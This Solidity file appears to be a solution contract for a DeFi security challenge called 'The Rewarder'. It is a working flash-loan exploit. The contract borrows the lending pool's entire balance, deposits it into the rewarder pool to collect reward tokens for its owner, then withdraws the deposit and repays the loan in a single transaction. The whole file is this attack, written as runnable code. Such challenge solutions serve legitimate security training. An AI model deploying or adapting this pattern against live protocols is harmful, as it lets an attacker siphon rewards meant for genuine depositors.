//SPDX-License-Identifier:MIT

pragma solidity ^0.8.16;
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);

    function transfer(address, uint256) external returns (bool);

    function approve(address, uint256) external returns (bool);
}

contract Solution {
    FlashLoanerPool private flashLoanerPool;
    TheRewarderPool private theRewarderPool;
    IERC20 private liquidityToken;
    IERC20 private rewardToken;
    address private owner;
    modifier OnlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    constructor(address _flashLoanerPool, address _theRewarderPool) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        owner = msg.sender;
    }

    function excute() public OnlyOwner {
        liquidityToken = IERC20(theRewarderPool.liquidityToken());
        rewardToken = IERC20(address(theRewarderPool.rewardToken()));
        uint256 flashLoanerPoolBalance = IERC20(liquidityToken).balanceOf(
            address(flashLoanerPool)
        );
        flashLoanerPool.flashLoan(flashLoanerPoolBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanerPool), "only flashLoanerPool");
        liquidityToken.approve(address(theRewarderPool), amount);
        //deposit to theRewarderPool and get the rewardToken
        theRewarderPool.deposit(amount);
        //transfer rewardToken to owner
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
